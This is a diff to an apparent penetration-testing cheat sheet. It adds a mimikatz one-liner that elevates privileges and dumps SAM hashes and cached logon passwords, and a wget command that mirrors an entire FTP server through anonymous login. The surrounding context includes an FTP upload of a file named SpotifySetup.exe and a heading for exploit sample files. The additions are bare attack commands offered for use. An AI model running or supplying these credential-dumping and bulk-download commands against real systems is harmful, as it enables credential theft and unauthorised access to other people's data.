@@ -3,6 +3,12 @@
 REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
 ```
 
+##### mimikatz one liner
+```powershell
+.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::msv" "lsadump::sam" "sekurlsa::logonpasswords" "exit"
+```
+
+
 # File Transfers
 
 ##### File transfer from Win PowerShell (may not work)
@@ -181,6 +187,10 @@ ftp> passive
 ftp> binary
 	200 Type set to I.
 ftp> put SpotifySetup.exe
+```
+#### Download everything from an FTP server
+```bash
+wget -m --no-passive ftp://anonymous:anonymous@192.168.x.245
 ```
 
 ##### Sample files for exploits (.jpgs, .ico, .bmp, .png, .txt, etc)
